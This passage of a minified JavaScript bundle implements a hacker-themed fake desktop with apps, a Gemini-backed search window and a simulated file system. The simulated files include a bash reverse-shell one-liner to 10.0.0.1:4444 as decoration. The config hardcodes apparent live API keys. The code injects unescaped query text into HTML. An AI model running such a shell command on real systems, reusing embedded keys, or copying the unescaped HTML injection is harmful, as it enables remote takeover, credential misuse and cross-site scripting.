                  `,i.appendChild(g)}},u=setInterval(p,1500);p(),i.addEventListener("click",a=>{if(a.target.classList.contains("kill-btn")){const n=a.target.dataset.appid;if(n==="sysmon")return;s(n),p()}}),e.cleanup=()=>{clearInterval(u)}}function xe(e){if(!e||typeof e!="string")return"";let o=e.replace(/\*\*(.*?)\*\*/g,"<strong>$1</strong>");return o=o.replace(/\*(.*?)\*/g,"<strong>$1</strong>"),o}async function ke(e,o,r=5){for(let t=0;t<r;t++)try{const s=await fetch(e,o);if(s.status===429&&t<r-1){const i=Math.pow(2,t)*1e3+Math.random()*1e3;await new Promise(p=>setTimeout(p,i));continue}if(!s.ok){const i=await s.json();throw new Error(`API call failed: ${s.status} - ${i.error.message}`)}return s}catch(s){if(t===r-1)throw s;const i=Math.pow(2,t)*1e3+Math.random()*1e3;await new Promise(p=>setTimeout(p,i))}}function te(e,o){const r=e.querySelector("#browser-content-area"),t=e.querySelector("#browser-url"),s=e.querySelector("#browser-back-btn"),i=e.querySelector("#browser-forward-btn");t.value=o.query,r.innerHTML=o.htmlContent,s.disabled=e.historyIndex<=0,i.disabled=e.historyIndex>=e.browserHistory.length-1}function Se(e){e.historyIndex>0&&(e.historyIndex--,te(e,e.browserHistory[e.historyIndex]))}function Le(e){e.historyIndex<e.browserHistory.length-1&&(e.historyIndex++,te(e,e.browserHistory[e.historyIndex]))}async function ee(e,o,r=!1,t={}){const{API_CONFIG:s}=t,i=e.querySelector("#browser-content-area"),p=e.querySelector("#browser-url"),u=e.querySelector("#browser-search-btn"),a=e.querySelector("#browser-progress-bar"),n=o;let g=o.toLowerCase().startsWith("http://")||o.toLowerCase().startsWith("https://")||o.toLowerCase().startsWith("www.");if(g&&!r&&o.match(/google\.com|bing\.com|yahoo\.com/i)){i.innerHTML=`
                      <div class="text-center p-8" style="background-color: rgba(255,0,0,0.1); border: 1px solid var(--danger-color);">
                          <h3 class="text-xl font-bold mb-3" style="color: var(--danger-color);">SECURITY BREACH DETECTED: ACCESS DENIED</h3>
                          <p style="color: var(--danger-color); opacity: 0.8;">Direct external URL access is restricted by DEVDEBUG OS kernel policies.</p>
                          <p class="text-green-500 text-opacity-70 mt-3">Hint: Use the search bar for queries, not full URLs.</p>
                      </div>
                  `,p.disabled=!1,u.disabled=!1,u.innerHTML="GO",p.focus();return}g?(i.innerHTML=`<div class="text-center p-8" style="background-color: var(--primary-color-darker); border: 1px solid var(--primary-color-dark);"><h3 class="text-xl font-bold mb-3" style="color: var(--primary-color);">Processing: ${o}</h3><p style="color: var(--text-color-dim); opacity: 0.7;">(Simulation protocol restricts direct external page access. Displaying a data summary.)</p></div>`,o=o.replace(/^(https?:\/\/)?(www\.)?/,"")):i.innerHTML=`<div class="text-center p-8" style="color: var(--text-color-dim);">Executing SEARCH for "${o}"...</div>`,p.disabled=!0,u.disabled=!0,u.innerHTML='<span class="text-red-500 font-mono">STOP</span>',e.querySelector("#browser-refresh-btn").disabled=!0,a.classList.remove("hidden"),a.style.width="0%",await new Promise(f=>setTimeout(f,100)),a.style.width="50%";const v={method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({contents:[{parts:[{text:o}]}],tools:[{google_search:{}}],systemInstruction:{parts:[{text:"You are a web search engine assistant. Summarize the requested information concisely and clearly based on the web results provided. Do not include a conversational preamble or sign-off, just the information."}]}})};let m="";try{const l=(await(await ke(s.GEMINI.URL+s.GEMINI.KEY,v)).json()).candidates?.[0];if(l&&l.content?.parts?.[0]?.text){const k=l.content.parts[0].text;let b=[];const x=l.groundingMetadata;x&&x.groundingAttributions&&(b=x.groundingAttributions.map(y=>({uri:y.web?.uri,title:y.web?.title})).filter(y=>y.uri&&y.title)),m=`<h3 class="text-lg font-bold mb-3" style="color: var(--primary-color);">${g?"DATA_STREAM for "+n:'SEARCH RESULTS for: "'+o+'"'}</h3>`,m+=`<div class="p-4 mb-4 leading-relaxed" style="background-color: var(--primary-color-darker); border: 1px solid var(--primary-color-dark);">${xe(k)}</div>`,b.length>0&&(m+='<h4 class="text-sm font-semibold mb-2" style="color: var(--text-color-dim);">ATTRIBUTION:</h4>',m+='<ul class="list-disc list-inside space-y-1 text-xs pl-4">',b.forEach((y,S)=>{m+=`<li><a href="#" data-internal-link="${y.uri}" class="internal-link transition-colors" style="color: var(--accent-color);" title="${y.uri}">[${S+1}] ${y.title}</a></li>`}),m+="</ul>"),i.innerHTML=m}else m=`<div class="text-red-500 p-4">ACCESS DENIED: Could not retrieve external data for "${o}".</div>`,i.innerHTML=m}catch(f){console.error("Browser Search Error:",f),m=`<div style="color: var(--danger-color);" class="p-4">API CONNECTION ERROR: ${f.message}. Check console for details.</div>`,i.innerHTML=m}finally{if(a.style.width="100%",await new Promise(f=>setTimeout(f,200)),a.classList.add("hidden"),p.disabled=!1,u.disabled=!1,u.innerHTML="GO",e.querySelector("#browser-refresh-btn")&&(e.querySelector("#browser-refresh-btn").disabled=!1),p.focus(),!r){const f={query:n,htmlContent:m};e.historyIndex<e.browserHistory.length-1&&(e.browserHistory=e.browserHistory.slice(0,e.historyIndex+1)),e.browserHistory.push(f),e.historyIndex=e.browserHistory.length-1;const h=e.querySelector("#browser-back-btn"),l=e.querySelector("#browser-forward-btn");h&&(h.disabled=e.historyIndex<=0),l&&(l.disabled=!0)}}}function we(e,o){e.browserHistory=[],e.historyIndex=-1,e.querySelector(".window-content").innerHTML=`
              <div class="flex flex-col h-full bg-black">
                  <!-- Address Bar and Navigation Controls -->
                  <div class="p-2 flex-shrink-0" style="background-color: var(--primary-color-darker); border-bottom: 1px solid var(--primary-color-dark);">
                      <div class="flex items-center space-x-1">
                          <!-- Navigation Buttons -->
                          <button id="browser-back-btn" title="Back" disabled
                              class="font-bold py-1 px-2 rounded-none transition-colors text-sm disabled:opacity-30 disabled:cursor-not-allowed" style="background-color: var(--primary-color-dark); color: var(--text-color-dim); border: 1px solid var(--primary-color-dark);">
                              &#9664;
                          </button>
                          <button id="browser-forward-btn" title="Forward" disabled
                              class="font-bold py-1 px-2 rounded-none transition-colors text-sm disabled:opacity-30 disabled:cursor-not-allowed" style="background-color: var(--primary-color-dark); color: var(--text-color-dim); border: 1px solid var(--primary-color-dark);">
                              &#9654;
                          </button>
                          <!-- Refresh Button -->
                          <button id="browser-refresh-btn" title="Refresh"
                              class="font-bold py-1 px-2 rounded-none transition-colors text-sm" style="background-color: var(--primary-color-dark); color: var(--text-color-dim); border: 1px solid var(--primary-color-dark);">
                              &#x21BB;
                          </button>
                          
                          <!-- URL/Search Input -->
                          <input type="text" id="browser-url" value=""
                              class="flex-grow p-2 bg-black rounded-none focus:ring-1 focus:outline-none text-sm" style="color: var(--primary-color); border: 1px solid var(--primary-color-dark); --ring-color: var(--primary-color);"
                              placeholder="EXECUTE or SEARCH"/>
                              
                          <!-- Go/Refresh/Stop Button -->
                          <button id="browser-search-btn"
                              class="text-black font-bold py-1 px-3 rounded-none transition-colors text-sm border border-black" style="background-color: var(--primary-color);">
                              GO
                          </button>
                      </div>
                      <!-- Loading Progress Bar -->
                      <div id="browser-progress-bar" class="h-0.5 mt-2 hidden transition-all duration-300 ease-linear" style="background-color: var(--accent-color);"></div>
                  </div>
                  
                  <!-- Content Area -->
                  <div id="browser-content-area" class="flex-grow overflow-y-auto p-4 bg-black text-sm">
                      <!-- Initial Content -->
                      <div class="p-4" style="background-color: var(--primary-color-darker); border: 1px solid var(--primary-color-dark);">
                          <p class="font-bold mb-1" style="color: var(--primary-color);">:: INITIALIZING WEB ACCESS ::</p>
                          <p style="color: var(--text-color-dim); opacity: 0.7;">Enter a query or target above and execute 'GO' to initiate a Google-grounded data retrieval via the Gemini API.</p>
                      </div>
                  </div>
              </div>
          `;const r=e.querySelector("#browser-url"),t=e.querySelector("#browser-search-btn"),s=e.querySelector("#browser-back-btn"),i=e.querySelector("#browser-forward-btn"),p=e.querySelector("#browser-refresh-btn"),u=()=>{const n=r.value.trim();n&&ee(e,n,!1,o)};s.addEventListener("click",()=>Se(e)),i.addEventListener("click",()=>Le(e));const a=()=>{const n=r.value.trim();n&&ee(e,n,!0,o)};p.addEventListener("click",a),t.addEventListener("click",u),r.addEventListener("keypress",n=>{n.key==="Enter"&&u()}),window.lucide&&window.lucide.createIcons({nodes:e.querySelectorAll("[data-lucide]")})}function Ce(e,o){const{fileSystem:r,openApp:t,WindowManager:s,focusWindow:i}=o,p=a=>{const n=a.split("/").filter(c=>c);let g=r.root;for(const c of n)if(g&&g.type==="folder"&&g.children[c])g=g.children[c];else return null;return g},u=a=>{const n=p(a);if(!n||n.type!=="folder"){e.querySelector(".window-content").innerHTML='<div class="p-4 text-red-500">Error: Path not found or is not a directory.</div>';return}let g="";const c=n.children,d=Object.keys(c).sort((f,h)=>{const l=c[f].type==="folder",k=c[h].type==="folder";return l&&!k?-1:!l&&k?1:f.localeCompare(h)});for(const f of d){const h=c[f],l=h.type==="folder"?"folder":"file-text";g+=`
                      <li class="p-1 flex items-center space-x-2 cursor-pointer hover:bg-green-900 rounded-sm" data-name="${f}" data-type="${h.type}">
                          <i data-lucide="${l}" class="w-4 h-4 flex-shrink-0"></i>
                          <span>${f}</span>
                      </li>
                  `}const v=a.substring(0,a.lastIndexOf("/"))||"/",m=a==="/";e.querySelector(".window-content").innerHTML=`
                  <div class="flex flex-col h-full">
                      <div class="p-2 flex items-center space-x-2 flex-shrink-0" style="background-color: var(--primary-color-darker); border-bottom: 1px solid var(--primary-color-dark);">
                          <button id="fs-back-btn" title="Up" ${m?"disabled":""} data-path="${v}" class="font-bold py-1 px-2 rounded-none transition-colors text-sm disabled:opacity-30 disabled:cursor-not-allowed" style="background-color: var(--primary-color-dark); color: var(--text-color-dim); border: 1px solid var(--primary-color-dark);">&#9650;</button>
                          <span class="text-sm truncate" style="color: var(--text-color-dim);">${a==="/"?"/root":a}</span>
                      </div>
                      <ul id="file-list" class="flex-grow p-2 space-y-1 text-sm overflow-y-auto" style="color: var(--text-color-dim);">
                          ${g||'<li class="p-2 text-gray-500 italic">This folder is empty.</li>'}
                      </ul>
                  </div>
              `,window.lucide&&window.lucide.createIcons({nodes:e.querySelectorAll("[data-lucide]")}),e.querySelector("#fs-back-btn").addEventListener("click",f=>{f.currentTarget.disabled||u(f.currentTarget.dataset.path)}),e.querySelector("#file-list").addEventListener("click",f=>{const h=f.target.closest("li");if(!h)return;const l=h.dataset.name,k=h.dataset.type,b=(a==="/"?"":a)+"/"+l;k==="folder"?u(b):typeof t=="function"&&(t("notes"),setTimeout(()=>{const x=s.openWindows.notes;if(x){const y=x.querySelector("textarea"),S=b.split("/").pop(),T=p(b);T&&(y.value=T.content||"",y.dataset.currentPath=b,x.querySelector(".title-bar span").textContent=`Notepad - ${S}`,typeof i=="function"&&i(x))}},100))})};u("/")}function Ie(e){e.querySelector(".window-content").innerHTML=`
              <div class="flex flex-col h-full">
                  <div class="p-2 text-xs border-b bg-gray-900 font-bold" style="border-color: var(--primary-color-dark); background-color: var(--primary-color-darker);">
                      <span>FILE_NAME</span>
                  </div>
                  <ul id="bin-file-list" class="flex-grow overflow-y-auto text-sm p-2 space-y-1">
                      <!-- Files will be injected here -->
                  </ul>
                  <div id="bin-footer" class="p-2 text-xs text-center" style="background-color: var(--primary-color-darker); border-top: 1px solid var(--primary-color-dark); color: var(--text-color-dim);">
                      5 items marked for deletion.
                  </div>
              </div>
          `;const o=e.querySelector("#bin-file-list");["shadow_creds.bak","keylog.dll","fsociety.dat","exploit_kit.zip","proxy_list.txt"].forEach(t=>{const s=document.createElement("li");s.id=`file-${t.replace(".","-")}`,s.className="p-1",s.style.opacity="0.5",s.innerHTML=`
                  <span style="color: var(--primary-color);">${t}</span>
              `,o.appendChild(s)})}const Z={OPENCAGE:{KEY:"23507e8676a141d688ca761c82fd9294",BASE_URL:"https://api.opencagedata.com/geocode/v1/json"},GEMINI:{URL:"https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key=",KEY:"AIzaSyD4q66eYQv-McwPHEbvqiWvhBCrDVIZzfY"}},z={TASKBAR_HEIGHT:40,MIN_WINDOW_WIDTH:200,MIN_WINDOW_HEIGHT:150,DEFAULT_Z_INDEX:100,DRAG_THRESHOLD:5,DEFAULT_MUSIC_VOLUME:.1,DEFAULT_SFX_VOLUME:.3},j={FADE_DURATION:500,BOOT_DELAY:1e3,AUTH_DELAY:2e3,RESIZE_DEBOUNCE:100},q={desktop:document.getElementById("desktop"),openWindows:{},nextZIndex:z.DEFAULT_Z_INDEX,windowCounter:0,isDraggingIcon:!1},J={root:{type:"folder",children:{files:{type:"folder",children:{"LOG_001.dat":{type:"file",content:`System boot sequence initiated...
Kernel loaded successfully.
All services started.`},"Matrix_Loop.gif":{type:"file",content:"GIF_DATA_STREAM::[...]"},backdoor_payloads:{type:"folder",children:{"reverse_shell.sh":{type:"file",content:`#!/bin/bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`}}}}},system:{type:"folder",children:{"config.sys":{type:"file",content:`DEVICE=C:\\DOS\\HIMEM.SYS
FILES=30`},"kernel.bin":{type:"file",content:"BINARY_DATA::[PROTECTED]"}}},users:{type:"folder",children:{DevDebug:{type:"folder",children:{"my_notes.txt":{type:"file",content:`TODO:
- Finish the kernel bypass exploit.
- Investigate the strange traffic on port 4444.
- Remember to delete browser history.`},"secret.txt":{type:"file",content:"Project Alpha is a go. The target is the E-Corp mainframe. We move at dawn."}}}}}}}},Y={browser:{title:"Browser",icon:"compass",initialWidth:600,initialHeight:450,content:""},files:{title:"File Explorer",icon:"folder-closed",initialWidth:450,initialHeight:350,content:""},notes:{title:"Notepad",icon:"sticky-note",initialWidth:400,initialHeight:300,content:""},robot:{title:"Mr Robot",icon:"bot-message-square",initialWidth:400,initialHeight:550,content:""},snake:{title:"Snake",icon:"line-squiggle",initialWidth:500,initialHeight:600,content:""},encryptr:{title:"Encryptr",icon:"lock-open",initialWidth:650,initialHeight:400,content:""},sysmon:{title:"Process Explorer",icon:"activity",initialWidth:450,initialHeight:300,minWidth:450,minHeight:300,content:""},"system-properties":{title:"System Properties",icon:"info",initialWidth:350,initialHeight:250,minWidth:350,minHeight:250,content:""},pong:{title:"Pong",icon:"eclipse",initialWidth:800,initialHeight:600,minWidth:800,minHeight:600,content:""},tictactoe:{title:"TicTacToe",icon:"grid-3x3",initialWidth:400,initialHeight:500,content:""},bin:{title:"Recycle Bin",icon:"trash",initialWidth:400,initialHeight:300,content:""},terminal:{title:"Terminal",icon:"terminal",initialWidth:600,initialHeight:400,minWidth:600,minHeight:400,content:""},"devdebug-profile":{title:"User Profile: DevDebug",icon:"user-circle",initialWidth:850,initialHeight:500,minWidth:850,minHeight:450,content:""},pixelr:{title:"Pixelr",icon:"paintbrush",initialWidth:600,initialHeight:600,content:""},settings:{title:"Settings",icon:"settings",initialWidth:750,initialHeight:500,minWidth:750,minHeight:500,content:""},map:{title:"Map",icon:"map",initialWidth:800,initialHeight:600,minWidth:800,minHeight:500,content:""},calculator:{title:"Calculator",icon:"calculator",initialWidth:350,initialHeight:500,minWidth:350,minHeight:500,content:""}};function Te(e){e.querySelector(".window-content").innerHTML=`
              <div class="p-4 text-sm space-y-3">
                  <div class="flex justify-between">
                      <span style="color: var(--text-color-dim);">OS Version:</span>
                      <span class="font-bold" style="color: var(--primary-color);">DEVDEBUG OS v1.0.0</span>
                  </div>
                  <div class="flex justify-between">
                      <span style="color: var(--text-color-dim);">System Uptime:</span>
                      <span id="system-uptime" class="font-bold" style="color: var(--primary-color);">00:00:00</span>
                  </div>
                  <div class="flex justify-between">
                      <span style="color: var(--text-color-dim);">Active Processes:</span>
                      <span id="active-processes" class="font-bold" style="color: var(--primary-color);">0</span>
                  </div>
                  <div class="flex justify-between">
                      <span style="color: var(--text-color-dim);">Processor</span>
                      <span class="font-bold" style="color: var(--primary-color);">Intel 4004</span>
                  </div>
                  <div class="flex justify-between">
                      <span style="color: var(--text-color-dim);">GPU</span>
                      <span class="font-bold" style="color: var(--primary-color);">NVIDIA Geforce 256</span>
                  </div>
              </div>
          `;const o=e.querySelector("#system-uptime"),r=e.querySelector("#active-processes"),t=window.osStartTime,s=()=>{const p=new Date-t;o.textContent=new Date(p).toISOString().substr(11,8),r.textContent=Object.keys(q.openWindows).length},i=setInterval(s,1e3);e.cleanup=()=>clearInterval(i),s()}function V(e){if(!e||typeof e!="string"){console.error("closeApp: Invalid appId provided");return}const o=q.openWindows[e];o&&(o.resizeObserver&&(o.resizeObserver.disconnect(),o.resizeObserver=null),o.cleanup&&o.cleanup(),e==="map"&&window.mapResizeObserver&&(window.mapResizeObserver.disconnect(),window.mapResizeObserver=null),o.remove(),delete q.openWindows[e])}function oe(e){const o=q.openWindows[e];o&&(o.style.display="none",o.isMinimized=!0,Q())}function Ee(e){const o=q.openWindows[e];if(!o)return;const r=o.querySelector(".title-bar"),t=o.querySelector(".maximize-btn");o.isMaximized?(o.style.top=o.previousState.top,o.style.left=o.previousState.left,o.style.width=o.previousState.width,o.style.height=o.previousState.height,o.isMaximized=!1,o.classList.remove("maximized"),r.style.cursor="grab",t.innerHTML=""):(o.previousState={top:o.style.top,left:o.style.left,width:o.style.width,height:o.style.height},o.style.top="0px",o.style.left="0px",o.style.width="100%",o.style.height=`calc(100% - ${z.TASKBAR_HEIGHT}px)`,o.isMaximized=!0,o.classList.add("maximized"),r.style.cursor="default",t.innerHTML=""),lucide.createIcons({nodes:t.querySelectorAll("i")})}function G(e){if(!e||!(e instanceof HTMLElement)){console.error("focusWindow: Invalid window element");return}q.nextZIndex+=1,e.style.zIndex=q.nextZIndex,Q()}function Me(e,o){if(!e||!o){console.error("makeDraggable: Invalid parameters");return}let r,t;if(e.isMaximized)return;const s=u=>{if(u.target.closest("button")||u.button!==0)return;G(e);const a=e.getBoundingClientRect();r=u.clientX-a.left,t=u.clientY-a.top,o.style.cursor="grabbing",document.addEventListener("mousemove",i),document.addEventListener("mouseup",p),u.preventDefault()},i=u=>{let a=u.clientX-r,n=u.clientY-t;const g=q.desktop.getBoundingClientRect();a=Math.max(0,Math.min(a,g.width-e.offsetWidth)),n=Math.max(0,Math.min(n,g.height-e.offsetHeight-z.TASKBAR_HEIGHT)),e.style.left=`${a}px`,e.style.top=`${n}px`},p=()=>{o.style.cursor="grab",document.removeEventListener("mousemove",i),document.removeEventListener("mouseup",p)};o.addEventListener("mousedown",s)}function Ae(e,o){if(!e||!o){console.error("makeResizable: Invalid parameters");return}let r,t,s,i;if(e.isMaximized)return;const p=n=>{n.button===0&&(G(e),r=n.clientX,t=n.clientY,s=e.offsetWidth,i=e.offsetHeight,document.addEventListener("mousemove",u),document.addEventListener("mouseup",a),n.preventDefault())},u=n=>{const g=n.clientX-r,c=n.clientY-t;let d=s+g,v=i+c;const m=e.minWidth||z.MIN_WINDOW_WIDTH,f=e.minHeight||z.MIN_WINDOW_HEIGHT;e.style.width=`${Math.max(m,d)}px`,e.style.height=`${Math.max(f,v)}px`},a=()=>{document.removeEventListener("mousemove",u),document.removeEventListener("mouseup",a)};o.addEventListener("mousedown",p)}function De(e){let o,r,t,s,i=!1;const p=z.DRAG_THRESHOLD,u=g=>{if(g.button!==0)return;o=g.clientX,r=g.clientY,i=!1;const c=e.getBoundingClientRect();t=g.clientX-c.left,s=g.clientY-c.top,e.style.cursor="grabbing",document.addEventListener("mousemove",a),document.addEventListener("mouseup",n),g.preventDefault(),g.stopPropagation()},a=g=>{const c=g.clientX-o,d=g.clientY-r;if(Math.abs(c)>p||Math.abs(d)>p){i=!0,q.isDraggingIcon=!0;const v=g.clientX-t,m=g.clientY-s,f=q.desktop.getBoundingClientRect(),h=Math.max(0,Math.min(v,f.width-e.offsetWidth)),l=Math.max(0,Math.min(m,f.height-e.offsetHeight-z.TASKBAR_HEIGHT));e.style.left=`${h}px`,e.style.top=`${l}px`}g.stopPropagation()},n=()=>{if(e.style.cursor="default",document.removeEventListener("mousemove",a),document.removeEventListener("mouseup",n),i){let d=parseFloat(e.style.left),v=parseFloat(e.style.top),m=Math.round((d-20)/100)*100+20,f=Math.round((v-20)/100)*100+20;const h=q.desktop.getBoundingClientRect();m=Math.max(20,Math.min(m,h.width-e.offsetWidth-20)),f=Math.max(20,Math.min(f,h.height-e.offsetHeight-z.TASKBAR_HEIGHT-20)),e.style.transition="all 0.2s cubic-bezier(0.175, 0.885, 0.32, 1.275)",e.style.left=`${m}px`,e.style.top=`${f}px`,setTimeout(()=>{e.style.transition="",q.isDraggingIcon=!1},200)}};e.addEventListener("mousedown",u)}function W(e){if(!e||typeof e!="string"){console.error("openApp: Invalid appId provided");return}if(q.openWindows[e]){G(q.openWindows[e]);return}const o=Y[e];if(!o){console.error(`Application configuration not found for ID: ${e}`);return}q.windowCounter++;const r=`${e}-${q.windowCounter}`,t=document.createElement("div");t.id=r,t.className="window p-0",t.style.width=`${o.initialWidth}px`,t.style.height=`${o.initialHeight}px`,t.minWidth=o.minWidth,t.minHeight=o.minHeight;const s=q.desktop.getBoundingClientRect(),i=o.initialWidth,p=o.initialHeight,u=(s.height-p)/2,a=(s.width-i)/2;t.style.top=`${Math.max(0,u)}px`,t.style.left=`${Math.max(0,a)}px`,G(t),t.innerHTML=`
        <!-- Title Bar -->
        <div class="title-bar p-2 flex items-center justify-between text-sm font-semibold">
            <div class="flex items-center space-x-2">
                <!-- Use Lucide icon based on config -->
                <i data-lucide="${o.icon}" class="w-5 h-5"></i>
                <span>${o.title}</span>
            </div>
            <div class="flex items-center space-x-1">
                <button class="minimize-btn w-3 h-3 rounded-none flex items-center justify-center font-bold transition-colors duration-150"
                        title="Minimize Window">
                    <!-- _ -->
                </button>
                <button class="maximize-btn w-3 h-3 rounded-none flex items-center justify-center transition-colors duration-150"
                        title="Maximize Window">
                    
                </button>
                <button class="close-btn w-3 h-3 rounded-none flex items-center justify-center transition-colors duration-150"
                        title="Close Window">
                    <!-- X -->
                </button>
            </div>
        </div>

        <!-- Window Content (Placeholder for initializer) -->
        <div class="window-content flex-grow flex flex-col overflow-auto">
            ${o.content}
        </div>

        <!-- Resize Handle (Bottom Right Corner) -->
        <div class="resize-handle bg-transparent transition-all duration-150"></div>
    `,q.desktop.appendChild(t),q.openWindows[e]=t,lucide.createIcons({attr:"data-lucide",className:"lucide-icon"}),e==="browser"&&we(t,{API_CONFIG:Z}),e==="robot"&&ge(t,{API_CONFIG:Z}),e==="notes"&&ye(t,{fileSystem:J,WindowManager:q,focusWindow:G}),e==="snake"&&re(t,q),e==="encryptr"&&le(t),e==="sysmon"&&be(t,{WindowManager:q,apps:Y,closeApp:V}),e==="pong"&&se(t,q),e==="tictactoe"&&ae(t),e==="files"&&Ce(t,{fileSystem:J,openApp:W,WindowManager:q,focusWindow:G}),e==="system-properties"&&Te(t),e==="bin"&&Ie(t),e==="terminal"&&ne(t,{fileSystem:J,WindowManager:q,apps:Y,openApp:W,closeApp:V}),e==="devdebug-profile"&&(async()=>await de(t,{openApp:W,WindowManager:q,focusWindow:G,navigateOrSearch:(m,f,h)=>ee(m,f,h,{API_CONFIG:Z})}))(),e==="pixelr"&&ue(t),e==="settings"&&pe(t,{openApp:W}),e==="map"&&ie(t,{API_CONFIG:Z,ANIMATION_CONSTANTS:j}),e==="calculator"&&ce(t),e==="map"&&t.resizeObserver&&(window.mapResizeObserver=t.resizeObserver);const n=t.querySelector(".title-bar"),g=t.querySelector(".minimize-btn"),c=t.querySelector(".maximize-btn"),d=t.querySelector(".close-btn"),v=t.querySelector(".resize-handle");g.addEventListener("click",()=>oe(e)),c.addEventListener("click",()=>Ee(e)),d.addEventListener("click",()=>V(e)),t.addEventListener("mousedown",m=>{m.target.closest(".title-bar")!==n&&G(t)}),t.isMaximized||(Me(t,n),Ae(t,v))}function _e(){const e=document.querySelectorAll(".desktop-icon");e.forEach(o=>{const r=o.dataset.appId;o.addEventListener("click",t=>{t.stopPropagation(),e.forEach(s=>s.classList.remove("selected")),o.classList.add("selected")}),r&&o.addEventListener("dblclick",t=>{t.stopPropagation(),W(r),o.classList.remove("selected")})}),q.desktop.addEventListener("click",o=>{o.target===q.desktop&&e.forEach(r=>r.classList.remove("selected"))})}function qe(e,o,r){const t=document.getElementById("context-menu"),s=document.getElementById("context-menu-items");s.innerHTML=`
              <li data-action="close-app" data-appid="${r}" class="p-2 text-sm cursor-pointer hover:bg-red-900" style="color: var(--danger-color);">Close</li>
          `;const i=40;t.style.top=`${o-i}px`,t.style.left=`${e}px`,t.classList.remove("hidden")}function Q(){const e=document.getElementById("app-tray");e.innerHTML="";for(const o in q.openWindows){const r=Y[o],t=q.openWindows[o],s=document.createElement("button");s.className="taskbar-app-icon h-full px-3 flex items-center justify-center",s.title=r.title,s.innerHTML=`<i data-lucide="${r.icon}" class="w-5 h-5"></i>`,parseInt(t.style.zIndex)===q.nextZIndex&&s.classList.add("active"),s.addEventListener("click",()=>{t.isMinimized?(t.style.display="flex",t.isMinimized=!1,G(t)):s.classList.contains("active")?oe(o):G(t)}),s.addEventListener("contextmenu",i=>{i.preventDefault(),i.stopPropagation(),qe(i.clientX,i.clientY,o)}),e.appendChild(s)}lucide.createIcons({nodes:e.querySelectorAll("[data-lucide]")})}function Pe(){const e=document.getElementById("current-time-display"),o=document.getElementById("current-date-display");function r(){const t=new Date,s=String(t.getDate()).padStart(2,"0"),i=String(t.getMonth()+1).padStart(2,"0"),p=t.getFullYear(),u=`${s}.${i}.${p}`,a=t.toLocaleTimeString("en-US",{hour12:!1,hour:"2-digit",minute:"2-digit",second:"2-digit"});e.textContent=a,o.textContent=u}r(),setInterval(r,1e3)}function He(){const e=document.getElementById("context-menu"),o=document.getElementById("context-menu-items");document.addEventListener("contextmenu",t=>{if(t.preventDefault(),t.target.closest(".window")||t.target.closest(".taskbar-app-icon")){e.classList.add("hidden");return}if(!t.target.closest("#desktop"))return;const i=!!document.fullscreenElement?"Exit Full Screen":"Full Screen";o.innerHTML=`
                  <li data-action="refresh" class="p-2 text-sm cursor-pointer hover:bg-blue-900" style="color: var(--text-color-dim);">Refresh</li>
                  <li data-action="fullscreen" class="p-2 text-sm cursor-pointer hover:bg-blue-900" style="color: var(--text-color-dim);">${i}</li>
                  <li data-action="settings" class="p-2 text-sm cursor-pointer hover:bg-blue-900" style="color: var(--text-color-dim);">Settings</li>
                  <li data-action="properties" class="p-2 text-sm cursor-pointer hover:bg-blue-900" style="color: var(--text-color-dim);">System Properties</li>
                  <li data-action="shutdown" class="p-2 text-sm cursor-pointer hover:bg-red-900" style="color: var(--danger-color);">Shutdown</li>
              `,e.style.top=`${t.clientY}px`,e.style.left=`${t.clientX}px`,e.classList.remove("hidden")}),document.addEventListener("click",()=>{e.classList.add("hidden")}),e.addEventListener("click",t=>{const s=t.target.dataset.action;if(s==="close-app"){const i=t.target.dataset.appid;i&&V(i)}if(s==="refresh"){const i=document.getElementById("desktop");i.style.transition="opacity 0.01s ease-in-out",i.style.opacity="0.5",setTimeout(()=>{lucide.createIcons(),i.style.opacity="1"},100)}else s==="fullscreen"?document.fullscreenElement?document.exitFullscreen():document.documentElement.requestFullscreen().catch(i=>{alert(`Error attempting to enable full-screen mode: ${i.message} (${i.name})`)}):s==="properties"?W("system-properties"):s==="settings"?W("settings"):s==="shutdown"&&(document.body.innerHTML='<div class="w-screen h-screen flex items-center justify-center bg-black text-2xl" style="color: var(--primary-color);">SYSTEM SHUTDOWN</div>',setTimeout(()=>{document.body.innerHTML="",document.body.style.backgroundColor="black"},2e3));e.classList.add("hidden")});const r=o.querySelector('[data-action="ui-config"]');r&&(r.dataset.action="settings",r.textContent="Settings")}function Ne(){const e=document.getElementById("background-music"),o=document.getElementById("music-mute-btn"),r=document.getElementById("volume-slider");e.volume=z.DEFAULT_MUSIC_VOLUME;let t=e.volume;const s=()=>{let p="volume-2";e.volume===0?p="volume-x":e.volume<.5&&(p="volume-1"),o.innerHTML=`<i data-lucide="${p}" class="w-5 h-5" style="color: var(--text-color-dim);"></i>`,lucide.createIcons({nodes:[o.querySelector("i")]})},i=()=>{e.volume>0?(t=e.volume,e.volume=0):e.volume=t,r.value=e.volume,s()};o.addEventListener("click",i),r.addEventListener("input",()=>{e.volume=parseFloat(r.value),s()}),r.value=e.volume,s()}function Be(){const e=document.getElementById("start-btn"),o=document.getElementById("start-menu"),r=document.getElementById("start-menu-apps"),t=document.getElementById("start-menu-restart"),s=document.getElementById("start-menu-shutdown"),i=document.getElementById("start-menu-profile-btn");r.innerHTML="";for(const p in Y){const u=Y[p],a=document.createElement("li");a.className="p-2 flex items-center space-x-3 rounded start-menu-item cursor-pointer",a.dataset.appId=p,a.innerHTML=`
                  <i data-lucide="${u.icon}" class="w-5 h-5"></i>
                  <span>${u.title}</span>
              `,r.appendChild(a)}lucide.createIcons({nodes:r.querySelectorAll("[data-lucide]")}),r.addEventListener("click",p=>{const u=p.target.closest("li[data-app-id]");u&&(W(u.dataset.appId),o.classList.add("hidden"))}),e.addEventListener("click",p=>{p.stopPropagation(),o.classList.toggle("hidden")}),document.addEventListener("click",p=>{!o.classList.contains("hidden")&&!o.contains(p.target)&&!e.contains(p.target)&&o.classList.add("hidden")}),t.addEventListener("click",()=>location.reload()),s.addEventListener("click",()=>document.body.innerHTML='<div class="w-screen h-screen flex items-center justify-center bg-black text-2xl" style="color: var(--primary-color);">SYSTEM SHUTDOWN...</div>'),i.addEventListener("click",()=>{W("devdebug-profile"),o.classList.add("hidden")})}function $e(){const e=document.getElementById("calendar-popup"),o=document.getElementById("system-tray").querySelector(".leading-tight"),r=document.getElementById("calendar-month-year"),t=document.getElementById("calendar-body"),s=document.getElementById("calendar-prev-month"),i=document.getElementById("calendar-next-month");let p=new Date;function u(a){t.innerHTML="";const 